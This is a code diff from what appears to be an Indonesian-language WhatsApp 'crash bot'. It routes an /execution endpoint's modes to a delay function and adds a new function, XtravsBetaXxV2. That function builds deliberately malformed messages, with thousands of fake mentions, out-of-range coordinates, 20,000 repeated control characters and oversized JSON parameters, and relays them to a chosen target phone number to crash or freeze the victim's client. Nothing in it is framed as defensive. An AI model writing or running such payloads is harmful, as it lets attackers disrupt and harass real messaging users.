@@ -606,11 +606,11 @@ app.get("/execution", (req, res) => {
 
     try {
       if (mode === "andros") {
-        Hadowhdelay(24, target);
+        Delayinvisdrayy(target);
       } else if (mode === "ios") {
-        Hadowhdelay(24, target);
+        Delayinvisdrayy(target);
       } else if (mode === "AndrosDelay") {
-        Hadowhdelay(10, target);
+        Delayinvisdrayy(target);
       } else {
         throw new Error("Mode tidak dikenal.");
       }
@@ -3691,6 +3691,137 @@ async function XNecroDozerX(target, mention) {
   }
 }
 
+async function XtravsBetaXxV2(target, mention) {
+  const BetaXxV1 = {
+    audioMessage: {
+      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
+      mimetype: "audio/mpeg",
+      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
+      fileLength: "389948",
+      seconds: 24,
+      ptt: false,
+      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
+      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
+      contextInfo: {
+        remoteJid: "status@broadcast",
+        participant: "0@s.whatsapp.net",
+        stanzaId: "1234567890ABCDEF",
+        mentionedJid: [
+          "6285215587498@s.whatsapp.net",  ...Array.from({ length: 1990 }, () => `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
+          ),
+        ],
+      },
+    },
+  };
+  
+  const BetaXxV2 = {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          header: {
+            title: "",
+            locationMessage: {
+              degreesLatitude: -999.03499999999999,
+              degreesLongitude: 922.999999999999,
+              name: "\u900A",
+              address: "\u0007".repeat(20000),
+              jpegThumbnail: null,
+            },
+            hasMediaAttachment: true,
+          },
+          body: { 
+            text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!" 
+          },
+          nativeFlowMessage: {
+            messageParamsJson: "[]".repeat(4000),
+            buttons: [
+              {
+                name: "single_select",
+                buttonParamsJson: JSON.stringify({
+                  title: "\u0003",
+                  sections: [
+                    {
+                      title: "\u0000",
+                      rows: [],
+                    },
+                  ],
+                }),
+              },
+              {
+                name: "call_permission_request",
+                buttonParamsJson: JSON.stringify({
+                name: "\u0003",
+                }),
+              },
+            ],
+          },
+          contextInfo: {
+            remoteJid: "status@broadcast",
+            participant: "0@s.whatsapp.net",
+            stanzaId: "1234567890ABCDEF",
+            mentionedJid: [
+              "6285215587498@s.whatsapp.net",  ...Array.from({ length: 1990 }, () => `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
+              ),
+            ],
+          },
+        },
+      },
+    },
+  };
+  
+  const msg = generateWAMessageFromContent(target, BetaXxV1, BetaXxV2, {});
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
+  
+  if (mention) {
+    await sock.relayMessage(
+      target, 
+      {
+        groupStatusMentionMessage: {
+          message: {
+            protocolMessage: {
+              key: msg.key,
+              type: 25
+            }
+          }
+        }
+      }, 
+      {
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: {
+              is_status_mention: " null - exexute "
+            },
+            content: undefined
+          }
+        ]
+      }
+    );
+  }
+}
 //═══════════//═════════⧼⧼FUNGSI REPEAT⧽⧽═════════//═══════════//
 async function Delayinvisdrayy(target) {
 for (let i = 0; i < 10; i++) {
